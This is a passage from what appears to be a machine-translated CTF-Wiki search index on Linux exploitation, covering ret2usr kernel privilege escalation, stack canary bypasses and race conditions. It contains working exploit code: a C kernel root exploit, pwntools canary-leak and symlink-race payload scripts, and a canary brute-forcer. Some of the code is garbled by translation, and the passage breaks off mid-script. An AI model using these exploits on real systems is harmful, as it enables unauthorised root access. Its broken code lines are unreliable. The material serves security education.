<p>https://www.anquanke.com/post/id/86490</p>"},{"location":"pwn/linux/kernel/ret2usr/","title":"ret2usr","text":""},{"location":"pwn/linux/kernel/ret2usr/#ret2usr","title":"ret2usr","text":"<p>The ret2usr attack exploits the user space of the user space to access the kernel space, but the kernel space can access the user space** This feature directs the kernel code or data stream to the user control, and performs the userspace code completion with the <code>ring 0</code> privilege. Wait for the operation.</p>"},{"location":"pwn/linux/kernel/ret2usr/#2018-core","title":"2018 \u5f3a\u7f51\u676f- core","text":"<p>The previous article analyzed the use of [kernel rop] (https://ctf-wiki.github.io/ctf-wiki/pwn/linux/kernel/kernel_rop/#kernel-rop-2018-core) to complete the lifting of the shell. Step, this analysis uses the ret2usr method to get the root shell.</p> <p>The topic is no longer analyzed, directly analyzing exp.</p> <pre><code>#include &lt;stdio.h&gt;\n\n#include &lt;stdlib.h&gt;\n\n#include &lt;unistd.h&gt;\n\n#include &lt;sys/stat.h&gt;\n\n#include &lt;fcntl.h&gt;\n\n#include &lt;string.h&gt;\n\n#include &lt;stdint.h&gt;\n\n\n\nsize_t user_cs, user_ss, user_rflags, user_sp;\n\nvoid save_status()\n\n{\n\n    __asm__(\"mov user_cs, cs;\"\n\n            \"mov user_ss, ss;\"\n\n            \"mov user_sp, rsp;\"\n\n&amp;quot;pushf;&amp;quot;\n            \"pop user_rflags;\"\n\n            );\n\n    puts(\"[*]status has been saved.\");\n\n}\n\n\n\n\n\nvoid get_shell(void){\n\n    system(\"/bin/sh\");\n\n}\n\n\n\nsize_t commit_creds = 0, prepare_kernel_cred = 0;\n\nsize_t raw_vmlinux_base = 0xffffffff81000000;\n\nsize_t vmlinux_base = 0;\n\nsize_t find_symbols()\n\n{\n\n    FILE* kallsyms_fd = fopen(\"/tmp/kallsyms\", \"r\");\n\n    /* FILE* kallsyms_fd = fopen(\"./test_kallsyms\", \"r\"); */\n\n\n\n    if(kallsyms_fd &lt; 0)\n\n    {\n\n        puts(\"[*]open kallsyms error!\");\n\n        exit(0);\n\n    }\n\n\n\n    char buf[0x30] = {0};\n\n    while(fgets(buf, 0x30, kallsyms_fd))\n\n    {\n\n        if(commit_creds &amp; prepare_kernel_cred)\n\n            return 0;\n\n\n\n        if(strstr(buf, \"commit_creds\") &amp;&amp; !commit_creds)\n\n        {\n\n            /* puts(buf); */\n\n            char hex[20] = {0};\n\n            strncpy(hex, buf, 16);\n\n            /* printf(\"hex: %s\\n\", hex); */\n\n            sscanf(hex, \"%llx\", &amp;commit_creds);\n\n            printf(\"commit_creds addr: %p\\n\", commit_creds);\n\n            vmlinux_base = commit_creds - 0x9c8e0;\n\n            printf(\"vmlinux_base addr: %p\\n\", vmlinux_base);\n\n        }\n\n\n\n        if(strstr(buf, \"prepare_kernel_cred\") &amp;&amp; !prepare_kernel_cred)\n\n        {\n\n            /* puts(buf); */\n\n            char hex[20] = {0};\n\n            strncpy(hex, buf, 16);\n\n            sscanf(hex, \"%llx\", &amp;prepare_kernel_cred);\n\n            printf(\"prepare_kernel_cred addr: %p\\n\", prepare_kernel_cred);\n\n            vmlinux_base = prepare_kernel_cred - 0x9cce0;\n\n            /* printf(\"vmlinux_base addr: %p\\n\", vmlinux_base); */\n\n        }\n\n    }\n\n\n\n    if(!(prepare_kernel_cred &amp; commit_creds))\n\n    {\n\n        puts(\"[*]Error!\");\n\n        exit(0);\n\n    }\n\n\n\n}\n\n\n\n\n\nvoid get_root()\n\n{\n\nchar * (* pkc) (int) = prepare_kernel_cred;\n    void (*cc)(char*) = commit_creds;\n\n(* cc) ((* pkc) (0));\n    /* puts(\"[*] root now.\"); */\n\n}\n\n\n\nvoid set_off(int fd, long long idx)\n\n{\n\n    printf(\"[*]set off to %ld\\n\", idx);\n\n    ioctl(fd, 0x6677889C, idx);\n\n}\n\n\n\nvoid core_read(int fd, char *buf)\n\n{\n\n    puts(\"[*]read to buf.\");\n\n    ioctl(fd, 0x6677889B, buf);\n\n\n\n}\n\n\n\nvoid core_copy_func(int fd, long long size)\n\n{\n\n    printf(\"[*]copy from user with size: %ld\\n\", size);\n\n    ioctl(fd, 0x6677889A, size);\n\n}\n\n\n\n\n\nint main(void)\n\n{\n\n    find_symbols();\n\n    size_t offset = vmlinux_base - raw_vmlinux_base;\n\n    save_status();\n\n\n\n    int fd = open(\"/proc/core\",O_RDWR);\n\n    set_off(fd, 0x40);\n\n    size_t buf[0x40/8];\n\n    core_read(fd, buf);\n\n    size_t canary = buf[0];\n\n    printf(\"[*]canary : %p\\n\", canary);\n\n\n    size_t rop[0x30] = {0};\n\n    rop[8] = canary ; \n\n    rop[10] = (size_t)get_root;\n\ncall [11] = 0xffffffff81a012da + offset; // swapgs; popfq; right\nrope [12] = 0;\ncall [13] = 0xffffffff81050ac2 + offset; // iretq; right;\n    rop[14] = (size_t)get_shell; \n\n    rop[15] = user_cs;\n\n    rop[16] = user_rflags;\n\n    rop[17] = user_sp;\n\n    rop[18] = user_ss;\n\n\n\n    puts(\"[*] DEBUG: \");\n\n    getchar();\n\n    write(fd, rop, 0x30 * 8);\n\n    core_copy_func(fd, 0xffffffffffff0000 | (0x100));\n\n}\n</code></pre> <p>Compare the similarities and differences between [kernel rop] (https://github.com/bash-c/pwn_repo/blob/master/QWB2018_core/rop.c).</p> <ol> <li>Get <code>commit_creds</code> and <code>prepare_kernel_cred</code> by reading <code>/tmp/kallsyms</code>, and determine the address of the gadget based on these offsets.</li> <li>The method of leak canary is the same, and the canary is read by controlling the global variable <code>off</code>.</li> <li>Unlike the kernel rop approach, the construction of the rop chain</li> <li>The kernel rop reaches the execution of <code>commit_creds(prepare_kernel_cred(0))</code> by the rop chain of the kernel space, and then returns to the user mode through <code>swapgs; iretq</code>, etc., and executes the <code>system(&amp;quot;/bin/ of the user space. Sh&amp;quot;)</code> Get the shell</li> <li>In the ret2usr approach, return directly to the user space constructor's <code>commit_creds(prepare_kernel_cred(0))</code> (implemented by function pointer) to raise the weight. Although these two functions are in kernel space, we are <code>ring 0</code> at this time. Privileges, so it works fine. Then also pass <code>swapgs; iretq</code> back to the user mode to execute the user space <code>system(&amp;quot;/bin/sh&amp;quot;)</code></li> </ol> <p>A comparison of these two approaches can be seen as the reason for <code>ret2usr</code> because it is generally much simpler to construct a specific purpose code in user space than in kernel space.</p>"},{"location":"pwn/linux/mitigation/canary/","title":"Canary","text":""},{"location":"pwn/linux/mitigation/canary/#introduction","title":"Introduction","text":"<p>Attacks caused by stack overflows are very common and very old. A mitigation technique called canary has long appeared in glibc and has been the first line of defense for system security.</p> <p>Canary is simple and efficient in both implementation and design. It is to insert a value. At the end of the high-risk area where stack overflow occurs, when the function returns, check if the value of canary has been changed to determine whether stack/buffer overflow is occur.</p> <p>Canary and GS protection under Windows are effective means to mitigate stack overflow. Its appearance largely increases the difficulty of exploiting a stack buffer overflow, and since it hardly consumes system resources, it has become the standard of protection mechanism under Linux.</p>"},{"location":"pwn/linux/mitigation/canary/#canary-principle","title":"Canary Principle","text":""},{"location":"pwn/linux/mitigation/canary/#using-canary-in-gcc","title":"Using Canary in GCC","text":"<p>Canary can be set in GCC with the following parameters:</p> <pre><code>-fstack-protector enables protection, but only inserts protection for functions that have arrays in local variables\n-fstack-protector-all Enable protection, insert protection for all functions\n-fstack-protector-strong\n-fstack-protector-explicit Only protects functions with explicit stack_protect attribute\n-fno-stack-protector Disable protection.\n</code></pre>"},{"location":"pwn/linux/mitigation/canary/#canary-implementation-principle","title":"Canary Implementation Principle","text":"<p>The stack structure that enables Canary protection is as follows</p> <pre><code>        High\n        Address |                 |\n\n                +-----------------+\n\n                | args            |\n\n                +-----------------+\n\n                | return address  |\n\n                +-----------------+\n\n        rbp =&gt;  | old ebp         |\n\n                +-----------------+\n\n      rbp-8 =&gt;  | canary value    |\n\n                +-----------------+\n\n                | Local variables |\n\n                +-----------------+\n\n        Low     |                 |\n        Address\n</code></pre> <p>When the program enables Canary compilation, the value at fs register 0x28 is taken in the prologue of the function and stored in the stack at %ebp-0x8. This operation is to insert the Canary value into the stack, the code is as follows:</p> <pre><code>mov    rax, qword ptr fs:[0x28]\nmov qword ptr [rbp-8], rax\n</code></pre> <p>This value is taken out before the function returns and XORed with the value of fs:0x28. If the result of the exclusive OR is 0, the canary is not modified, and the function returns normally. This operation is to detect whether a stack overflow occurs.</p> <pre><code>mov rdx, QWORD PTR [rbp-0x8]\nxor rdx, QWORD PTR fs: 0x28\nje 0x4005d7 &lt;main+65&gt;\ncall   0x400460 &lt;__stack_chk_fail@plt&gt;\n</code></pre> <p>If the canary has been illegally modified, the program flow will go to <code>__stack_chk_fail</code>. <code>__stack_chk_fail</code> is also a function in glibc, which by default is delayed by ELF and is defined as follows.</p> <pre><code>eglibc-2.19/debug/stack_chk_fail.c\nvoid __attribute__ ((noreturn)) __stack_chk_fail (void)\n{\n  __fortify_fail (\"stack smashing detected\");\n}\nvoid __attribute__ ((noreturn)) internal_function __fortify_fail (const char *msg)\n{\n  /* The loop is added only to keep gcc happy.  */\n  while (1)\n    __libc_message (2, \"*** %s ***: %s terminated\\n\",\n                    msg, __libc_argv[0] ?: \"&lt;unknown&gt;\");\n}\n</code></pre> <p>This means that you can hijack the process by hijacking the <code>__stack_chk_fail</code>'s got value or leaking content with <code>__stack_chk_fail</code> (see stack smash).</p> <p>Further, for Linux, the fs register actually points to the TLS structure of the current stack, and fs:0x28 points to stack_guard. <pre><code>typedef struct\n{\n  void *tcb;        /* Pointer to the TCB.  Not necessarily the\n                                   thread descriptor used by libpthread.  */\n  dtv_t * dtv;\n  void *self;       /* Pointer to the thread descriptor.  */\n  int multiple_threads;\n  uintptr_t sysinfo;\n  uintptr_t stack_guard;\n  ...\n} tcbhead_t;\n</code></pre></p> <p>A bypass protection mechanism can be implemented if there is an overflow that overrides the Canary value stored in TLS.</p> <p>In fact, the value in TLS is initialized by the function security_init.</p> <pre><code>static void\nsecurity_init (void)\n{\n// The value of _dl_random is already written by the kernel when entering this function.\n// glibc directly uses the value of _dl_random and does not assign it\n// If you don&amp;#39;t use this mode, glibc can also generate random numbers by itself.\n/ / Set the last byte of _dl_random to 0x0\nuintptr_t stack_chk_guard = _dl_setup_stack_chk_guard (_dl_random);\n/ / Set the value of Canary to TLS\nTHREAD_SET_STACK_GUARD (stack_chk_guard);\n_dl_random = NULL;\n}\n//THREAD_SET_STACK_GUARD macro is used to set TLS\n#define THREAD_SET_STACK_GUARD(value) \\\nTHREAD_SETMEM (THREAD_SELF, header.stack_guard, value)\n</code></pre>"},{"location":"pwn/linux/mitigation/canary/#canary-bypass-technology","title":"Canary bypass technology","text":""},{"location":"pwn/linux/mitigation/canary/#preface","title":"Preface","text":"<p>Canary is a very effective vulnerability mitigation for stack overflow issues. But it does not mean that Canary can block all stack overflow exploits. Here is a common stack overflow exploit that exists in Canary. Please note that each method has specific environment requirements.</p>"},{"location":"pwn/linux/mitigation/canary/#canary-leaks-canary","title":"Canary leaks Canary","text":"<p>Canary is designed to end in bytes <code>\\x00</code>, which is meant to ensure that Canary can truncate strings. The idea of leaking Canary in the stack is to overwrite the low byte of Canary to print out the remaining Canary part. This type of utilization requires the existence of a suitable output function, and may require the first overflow to leak Canary, and then overflow the control execution flow again.</p>"},{"location":"pwn/linux/mitigation/canary/#using-examples","title":"Using examples","text":"<p>The sample source code for the vulnerability is as follows:</p> <pre><code>// ex2.c\n#include &lt;stdio.h&gt;\n#include &lt;unistd.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;string.h&gt;\nvoid getshell(void) {\n    system(\"/bin/sh\");\n}\nvoid init() {\n    setbuf(stdin, NULL);\n    setbuf(stdout, NULL);\n    setbuf(stderr, NULL);\n}\nvoid vuln() {\n    char buf[100];\n    for(int i=0;i&lt;2;i++){\n        read(0, buf, 0x200);\n        printf(buf);\n    }\n}\nint main(void) {\n    init();\n    puts(\"Hello Hacker!\");\n    vuln ();\n    return 0;\n}\n</code></pre> <p>Compile as 32bit program and disable PIE protection (NX, ASLR and Canary protection are invoked by default)</p> <pre><code>$ gcc -m32 -no-pie ex2.c -o ex2 \n</code></pre> <p>First print out the 4-digit Canary by overwriting the last <code>\\x00</code> byte of Canary After that, calculate the offset, fill Canary into the corresponding overflow position, and implement Ret into the getshell function.</p> <pre><code>#!/usr/bin/env python\nfrom pwn import *\ncontext.binary = 'ex2'\n#context.log_level = 'debug'\nio = process (&amp;#39;./ ex2&amp;#39;)\nget_shell = ELF(\"./ex2\").sym[\"getshell\"]\nio.recvuntil (&amp;quot;Hello Hacker!\n# leak Canary\npayload = \"A\"*100\nio.sendline(payload)\nio.recvuntil ( &amp;quot;A&amp;quot; * 100)\nCanary = u32(io.recv(4))-0xa\nlog.info(\"Canary:\"+hex(Canary))\n# Bypass Canary\npayload = \"\\x90\"*100+p32(Canary)+\"\\x90\"*12+p32(get_shell)\nio.send(payload)\nio.recv ()\nio.interactive ()\n</code></pre>"},{"location":"pwn/linux/mitigation/canary/#one-by-one-crack-canary","title":"one-by-one crack Canary","text":"<p>For Canary, although the Canary is different each time the same process restarts (the same as GS, GS is restarted), but the Canary of each thread in the same process is identical. Also, there is a class that opens the child process interaction through the fork function, because the fork function directly copies the memory of the parent process, so the Canary of each child process created is the same. We can use this feature to completely blast Canary byte by byte. In the famous offset2libc bypassing all protected linux64bit articles, the author is using this way to blast the Canary: This is the Python code for blasting:</p> <pre><code>print \"[+] Brute forcing stack canary \"\nstart = len (p)\nstop = len (p) +8\nwhile len(p) &lt; stop:\n   for i in xrange(0,256):\n      res = send2server(p + chr(i))\n      if res != \"\":\n         p = p + chr(i)\n         #print \"\\t[+] Byte found 0x%02x\" % i\n         break\n      if i == 255:\n         print \"[-] Exploit failed\"\n         sys.exit(-1)\ncanary = p[stop:start-1:-1].encode(\"hex\")\nprint \"   [+] SSP value is 0x%s\" % canary\n</code></pre>"},{"location":"pwn/linux/mitigation/canary/#hijack-__stack_chk_fail-function","title":"Hijack __stack_chk_fail function","text":"<p>The processing logic that knows that Canary fails will enter the <code>__stack_chk_fail</code>ed function. The <code>__stack_chk_fail</code>ed function is a normal delay binding function that can be hijacked by modifying the GOT table.</p> <p>See ZCTF2017 Login, using the GTS table of <code>__stack_chk_fail</code> by fsb vulnerability, and then using ROP</p>"},{"location":"pwn/linux/mitigation/canary/#override-the-canary-value-stored-in-tls","title":"Override the Canary value stored in TLS","text":"<p>It is known that Canary is stored in TLS and will be compared using this value before the function returns. When the overflow size is large, it can overwrite the Canary and TLS stored Canary implementations stored on the stack at the same time.</p> <p>See StarCTF2018 babystack</p>"},{"location":"pwn/linux/race-condition/introduction/","title":"Race Condition","text":""},{"location":"pwn/linux/race-condition/introduction/#overview","title":"Overview","text":"<p>Conditional competition refers to the order in which a system's operations depend on the order of uncontrolled events. When these uncontrolled events do not run the way the developer wants, bugs can occur. This term originally comes from the fact that two electrical signals compete with each other to affect the output.</p> <p></p> <p>Conditional competition mainly occurs in the following fields</p> <ul> <li>Electronic systems, especially logic circuits</li> <li>Computers, especially multithreaded programs and distributed programs.</li> </ul> <p>Due to the large number of concurrent programming in the current system, resources are often shared, which often leads to conditional competition loopholes.</p> <p>Here we mainly consider the conditional competition in computer programs. Conditional contention can occur when the results of a piece of software depend on the order of processes or threads. For a simple consideration, you can know that conditional competition requires the following conditions**:</p> <ul> <li>Concurrency, ie there are at least two concurrent execution flows. The execution flow here includes execution flows at the threads, processes, tasks, and so on.</li> <li>Shared objects, that is, multiple concurrent streams access the same object. Common shared objects have shared memory, file system, and signals. In general, these shared objects are used to allow multiple program execution flows to communicate with each other. ** In addition, we call the code to access the shared object critical section**. This part should be locked when writing code normally.</li> <li>Change the object, ie at least one control flow will change the state of the competing object. Because if the program just reads the object, it does not create conditional competition.</li> </ul> <p>Since the execution flow is highly uncertain at the time of concurrency, conditional competition is relatively difficult to detect, and it is difficult to reproduce and debug. This brings great difficulties to the competition for repair conditions.</p> <p>The effects of conditional competition are also diverse, and the program is executed abnormally and the program crashes. If the conditional contention vulnerability is exploited by an attacker, it is likely that the attacker will gain the privileges of the corresponding system.</p> <p>Here is a simple example.</p> <pre><code>#include &lt;pthread.h&gt;\n\n#include &lt;stdio.h&gt;\n\n\n\nint counter;\n\nvoid *IncreaseCounter(void *args) {\n\n  counter += 1;\n\n  sleep(0.1);\n\n  printf(\"Thread %d has counter value %d\\n\", (unsigned int)pthread_self(),\n\n         counter);\n\n}\n\n\n\nint main() {\n\n  pthread_t p[10];\n\n  for (int i = 0; i &lt; 10; ++i) {\n\n    pthread_create(&amp;p[i], NULL, IncreaseCounter, NULL);\n\n  }\n\n  for (int i = 0; i &lt; 10; ++i) {\n\n    pthread_join(p[i], NULL);\n\n  }\n\n  return 0;\n\n}\n</code></pre> <p>In general, we may wish to output as follows</p> <pre><code>\u279c  005race_condition ./example1\n\nThread 1859024640 has counter value 1\n\nThread 1841583872 has counter value 2\n\nThread 1832863488 has counter value 3\n\nThread 1824143104 has counter value 4\n\nThread 1744828160 has counter value 5\n\nThread 1736107776 has counter value 6\n\nThread 1727387392 has counter value 7\n\nThread 1850304256 has counter value 8\n\nThread 1709946624 has counter value 9\n\nThread 1718667008 has counter value 10\n</code></pre> <p>However, due to the existence of conditional competition, the final output is often unsatisfactory.</p> <pre><code>\u279c  005race_condition ./example1\n\nThread 1417475840 has counter value 2\n\nThread 1408755456 has counter value 2\n\nThread 1391314688 has counter value 8\n\nThread 1356433152 has counter value 8\n\nThread 1365153536 has counter value 8\n\nThread 1373873920 has counter value 8\n\nThread 1382594304 has counter value 8\n\nThread 1400035072 has counter value 8\n\nThread 1275066112 has counter value 9\n\nThread 1266345728 has counter value 10\n</code></pre> <p>Think carefully about why conditional competition can happen? Take the following as a specific example</p> <ul> <li>The program first executed action1 and then executed action2. The action may be at the application level or at the operating system level. Normally, we want the condition generated by action1 to be satisfied when the program executes action2.</li> <li>But due to the concurrency of the program, it is very likely that the attacker can destroy the conditions generated by action1 in this short time window before action2 is executed. At this time, the attacker's operation competes with action2, so it may affect the execution of the program.</li> </ul> <p></p> <p>So I think the root of the problem is that although the programmer assumes that a certain condition should be satisfied in the corresponding time period, often the condition may be modified in this small time window. **Although the interval between this time may be very small, the attacker may still be able to perform some operations (such as computationally intensive operations, Dos attacks) to make the processing speed of the victim machine relatively slower. **</p>"},{"location":"pwn/linux/race-condition/introduction/#form","title":"Form","text":"<p>Common conditional competition has the following form.</p>"},{"location":"pwn/linux/race-condition/introduction/#cwe-367-toctou-race-condition","title":"CWE-367: TOCTOU Race Condition","text":""},{"location":"pwn/linux/race-condition/introduction/#description","title":"Description","text":"<p>TOCTOC (Time-of-check Time-of-use) refers to the program will check before using resources (variables, memory, files), but the resources are modified before the program uses the corresponding resources.</p> <p></p> <p>Some more specific examples are given below.</p>"},{"location":"pwn/linux/race-condition/introduction/#cwe-365-race-condition-in-switch","title":"CWE-365: Race Condition in Switch","text":"<p>When the program is executing a switch statement, if the value of the switch variable is changed, it can cause unpredictable behavior. Especially after the case statement does not write the code of the break statement, once the switch variable changes, it is likely to change the original logic of the program.</p>"},{"location":"pwn/linux/race-condition/introduction/#cwe-363-race-condition-enabling-link-following","title":"CWE-363: Race Condition Enabling Link Following","text":"<p>We know that there are two ways to name files in Linux.</p> <ul> <li>File path name</li> <li>file descriptor</li> </ul> <p>However, the way these two names are resolved to the corresponding object is different.</p> <ul> <li>When the file path name is parsed, it is indirectly parsed by the passed path (file name, hard link, soft link)**, and the passed parameters are not the real address (inode) of the corresponding file.</li> <li>File descriptors are resolved by accessing a pointer that points directly to the file.</li> </ul> <p>It is because of the indirectness that the time window we mentioned above is produced.</p> <p>Taking the following code as an example, the program checks for the existence of a file before accessing it, and then opens the file and then performs the operation. But if, after checking, the attacker modifies the file to a symbolic link before actually using the file, the program will access the wrong file.</p> <p></p> <p>The root cause of this kind of conditional competition is the problem of name object binding in the file system. The following functions will use the file name as a parameter: access(), open(), creat(), mkdir(), unlink(), rmdir(), chown(), symlink(), link(), rename() , chroot(),...</p> <p>How to avoid this problem? We can use the fstat function to read the file information and store it in the stat structure, and then we can compare this information with our known information to determine if we have read the correct information. Among them, the <code>st_ino</code> and <code>st_dev</code> variables in the stat structure can uniquely represent files.</p> <ul> <li><code>st_ino</code> contains the serial number of the file, ie <code>i-node</code></li> <li><code>st_dev</code> contains the device corresponding to the file.</li> </ul> <p></p>"},{"location":"pwn/linux/race-condition/introduction/#cwe-364-signal-handler-race-condition","title":"CWE-364: Signal Handler Race Condition","text":""},{"location":"pwn/linux/race-condition/introduction/#overview_1","title":"Overview","text":"<p>Conditional competition often occurs in signal handlers because the signal handler supports asynchronous operations. Especially when the signal processing program is **non-reentrant or state sensitive, the attacker may use the conditional competition in the signal processing program to achieve the effect of denial of service attack and code execution. For example, if the free operation is executed in the signal processing program, then a signal is sent again, and then the signal processing program will perform the free operation again. At this time, double free will occur, and then a little operation may be possible. Can achieve the effect of any address write.</p> <p>In general, the common conditions of competition related to signal processing procedures are</p> <ul> <li>Signal handlers share common variables and data segments with normal code segments.</li> <li>Share status in different signal handlers.</li> <li>The signal handler itself uses functions that are not reentrant, such as malloc and free.</li> <li>A signal handler handles multiple signals, which in turn can lead to use after free and double free vulnerabilities.</li> <li>Use mechanisms such as setjmp or longjmp to prevent the signal handler from returning to the original program execution flow.</li> </ul>"},{"location":"pwn/linux/race-condition/introduction/#thread-safe-and-reentrant","title":"Thread safe and reentrant","text":"<p>Here is a description of the relationship between thread safety and reentrancy.</p> <ul> <li>Thread safe</li> <li>That is, the function can be called by multiple threads without any problems.</li> <li>conditions</li> <li>There are no shared resources themselves</li> <li>There are shared resources that need to be locked.</li> <li>Reusable</li> <li>A function can be run in the same address space by multiple instances at the same time.</li> <li>Reentrant functions can be interrupted, and other code does not lose data integrity when entering the function. So the reentrant function must be thread safe.</li> <li>Reentrant emphasizes that when a single thread executes, it is still safe to re-enter the same subroutine.</li> <li>does not meet the conditions</li> <li>The function body uses a static data structure and is not a constant</li> <li>The function uses the malloc or free function</li> <li>The function uses a standard IO function.</li> <li>The function called is not reentrant.</li> <li>All variables used by the reentrant function are saved in the current [Call Stack] (https://zh.wikipedia.org/wiki/%E8%B0%83%E7%94%A8%E6%A0%88) [Function stack] (https://zh.wikipedia.org/w/index.php?title=%E5%87%BD%E6%95%B0%E6%A0%88&amp;action=edit&amp;redlink=1)(frame) .</li> </ul>"},{"location":"pwn/linux/race-condition/introduction/#prevention","title":"Prevention","text":"<p>If you want to eliminate conditional competition, the primary goal is to find the race windows.</p> <p>The so-called competition window is the code segment that accesses the competing object, which gives the attacker a corresponding opportunity to modify the corresponding competing object.</p> <p>In general, if we can make the conflicting competition windows mutually exclusive, then we can eliminate the competition conditions.</p>"},{"location":"pwn/linux/race-condition/introduction/#synchronization-primitive","title":"Synchronization primitive","text":"<p>In general, we use synchronization primitives to eliminate race conditions. Common as follows</p> <ul> <li>lock variable</li> <li>Usually mutual exclusion, give up the CPU during the wait, enter the idle state, and try automatically after a while.</li> <li>Spinlock, do not give up the CPU while waiting, try it all the time.</li> <li>Conditional variables</li> <li>** Condition variables are used to wait instead of being used for locking. Condition variables are used to automatically block a thread until a special condition occurs. Usually condition variables and mutex locks are used at the same time. **</li> <li> <p>Critical section object, CRITICAL_SECTION</p> </li> <li> <p>A semaphore that controls the number of threads that can access a critical section, typically greater than one.</p> </li> <li>Pipeline, a shared file used to connect a read process and a write process to communicate between them. Its lifetime does not exceed the lifetime of the process that created the pipeline.</li> <li>Named pipes, which can be as long as the operating system runtime.</li> </ul> <pre><code>#Create a pipe\nmkfifo my_pipe\n\n# gzip reads data from a given pipe and compresses the data into out.gz\ngzip -9 -c &lt; my_pipe &gt; out.gz &amp;\n\n#\u9001\u6570\u636e\u6570\u636e\u6570\u636e\ncat file &gt; my_pipe\n</code></pre>"},{"location":"pwn/linux/race-condition/introduction/#deadlock","title":"Deadlock","text":""},{"location":"pwn/linux/race-condition/introduction/#overview_2","title":"Overview","text":"<p>When the synchronization primitive is used inappropriately, the process may be deadlocked. When two or more execution flows block each other and cannot continue execution, a deadlock occurs. In fact, the deadlock is mainly because in the execution flow of the conflict, there is a loop waiting execution flow, that is, each execution flow in the loop waits to obtain a resource while trying to obtain the next resource. As shown in the figure below, both P1 and P2 processes require resources to continue running. P1 owns resource R2 and needs additional resource R1 to run. P2 owns resource R1 and needs additional resource R2 to run. Both sides wait for each other and no one can run.</p> <p></p> <p>In general, deadlocks have the following four requirements:</p> <ul> <li>Mutually exclusive, resources are mutually exclusive.</li> <li>Hold and wait, hold existing resources while waiting for the next resource.</li> <li>Cannot be preempted. Before the resources obtained by the process are not used, the resource applicant cannot forcibly seize resources from the resource occupants, but can only be released by the occupant process of the resource.</li> <li>Loop wait, loop waiting for resources.</li> </ul> <p>And if you want to eliminate the deadlock, it is to break the four necessary conditions above.</p> <p>In addition, the deadlock may be due to the following reasons</p> <ul> <li>Processor speed</li> <li>Changes in the process or thread scheduling algorithm</li> <li>Different memory limits during the execution process.</li> <li>Any asynchronous event that can interrupt program execution.</li> </ul>"},{"location":"pwn/linux/race-condition/introduction/#influences","title":"influences","text":"<p>Deadlocks typically cause a denial of service attack.</p>"},{"location":"pwn/linux/race-condition/introduction/#detection","title":"Detection","text":"<p>So, when it comes to this, is it possible for us to detect conditional competition loopholes? At present, there is indeed research in this area, and it is mainly detected from two aspects of static analysis and dynamic analysis.</p>"},{"location":"pwn/linux/race-condition/introduction/#static-detection","title":"Static detection","text":"<p>Currently known static detection tools are available</p> <ul> <li>[Flawfinder] (http://www.dwheeler.com/flawfinder/)</li> <li>Target: C/C++ source code</li> <li>steps</li> <li>Create a vulnerability database</li> <li>Simple text pattern matching without any data flow or control flow analysis</li> <li> <p>ThreadSanitizer</p> </li> <li> <p>Target: C++ and GO</p> </li> <li>Implementation: LLVM</li> </ul>"},{"location":"pwn/linux/race-condition/introduction/#dynamic-detection","title":"Dynamic detection","text":"<ul> <li> <p>Intel Inspector</p> </li> <li> <p>Valgrind</p> </li> </ul>"},{"location":"pwn/linux/race-condition/introduction/#_1","title":"\u53c2\u8003","text":"<ul> <li> <p>http://www.teraits.com/pitagoras/marcio/segapp/05.ppt</p> </li> <li> <p>http://repository.root-me.org/Programmation/C%20-%20C++/EN%20-%20Secure%20Coding%20in%20C%20and%20C++%20Race%20Conditions.pdf</p> </li> <li> <p>https://www.blackhat.com/presentations/bh-europe-04/bh-eu-04-tsyrklevich/bh-eu-04-tsyrklevich.pdf</p> </li> <li> <p>https://xinhuang.github.io/posts/2014-09-23-detect-race-condition-using-clang-thread-sanitizer.html</p> </li> <li> <p>https://llvm.org/devmtg/2011-11/Hutchins_ThreadSafety.pdf</p> </li> <li> <p>http://www.cnblogs.com/biyeymyhjob/archive/2012/07/20/2601655.html</p> </li> <li> <p>http://www.cnblogs.com/huxiao-tee/p/4660352.html</p> </li> <li> <p>https://github.com/dirtycow/dirtycow.github.io</p> </li> </ul>"},{"location":"pwn/linux/race-condition/problem/","title":"\u9898","text":""},{"location":"pwn/linux/race-condition/problem/#construction-example","title":"Construction example","text":""},{"location":"pwn/linux/race-condition/problem/#source-code","title":"Source code","text":"<p>The source code is as follows</p> <pre><code>#include &lt;fcntl.h&gt;\n\n#include &lt;stdio.h&gt;\n\n#include &lt;stdlib.h&gt;\n\n#include &lt;string.h&gt;\n\n#include &lt;sys/stat.h&gt;\n\n#include &lt;unistd.h&gt;\n\nvoid showflag() { system(\"cat flag\"); }\n\nvoid vuln(char *file, char *buf) {\n\n  int number;\n\n  int index = 0;\n\n  int fd = open(file, O_RDONLY);\n\n  if (fd == -1) {\n\n    perror(\"open file failed!!\");\n\n    return;\n\n  }\n\n  while (1) {\n\n    number = read(fd, buf + index, 128);\n\n    if (number &lt;= 0) {\n\n      break;\n\n    }\n\n    index += number;\n\n  }\n\n  buf[index + 1] = '\\x00';\n\n}\n\nvoid check(char *file) {\n\n  struct stat tmp;\n\n  if (strcmp(file, \"flag\") == 0) {\n\n    puts(\"file can not be flag!!\");\n\n    exit(0);\n\n  }\n\n  stat(file, &amp;tmp);\n\n  if (tmp.st_size &gt; 255) {\n\n    puts(\"file size is too large!!\");\n\n    exit(0);\n\n  }\n\n}\n\nint main(int argc, char *argv[argc]) {\n\n  char buf[256];\n\n  if (argc == 2) {\n\n    check(argv[1]);\n\n    vuln(argv[1], buf);\n\n  } else {\n\n    puts(\"Usage ./prog &lt;filename&gt;\");\n\n  }\n\n  return 0;\n\n}\n</code></pre>"},{"location":"pwn/linux/race-condition/problem/#analysis","title":"Analysis","text":"<p>It can be seen that the basic flow of the program is as follows</p> <ul> <li>Check if the incoming command line argument is \"flag\" and if so, exit.</li> <li>Check if the file size corresponding to the incoming command line parameter is greater than 255. If so, exit directly.</li> <li>Read the contents of the file corresponding to the command line parameters into buf. The size of buf is 256.</li> </ul> <p>It seems that we checked the size of the file, and the size of the buf can also meet the corresponding maximum size, but there is a problem of conditional competition.</p> <p>If we delete the corresponding file after the program has checked the corresponding file size and symbolically link to another larger file, the program will read more content, which will cause stack overflow.</p>"},{"location":"pwn/linux/race-condition/problem/#the-basic-idea","title":"The basic idea","text":"<p>Well, the basic idea is coming, we want to get the corresponding <code>flag</code> content. Then we only need to modify the return address of the corresponding <code>main</code> function through stack overflow. The address of <code>showflag</code> can be obtained through disassembly and debugging, and the corresponding payload is obtained.</p> <pre><code>\u279c race test cat payload.py\nfrom pwn import *\n\ntest = ELF (&amp;#39;./ test&amp;#39;)\npayload = 'a' * 0x100 + 'b' * 8 + p64(test.symbols['showflag'])\n\nopen('big', 'w').write(payload)\n</code></pre> <p>The script that competes for the two conditions is</p> <pre><code>Exp racing test cat exp.sh\n#! / Bin / sh\nfor i in `seq 500`\n\ndo\n\n    cp small fake\n\n    sleep 0.000008\n\n    rm 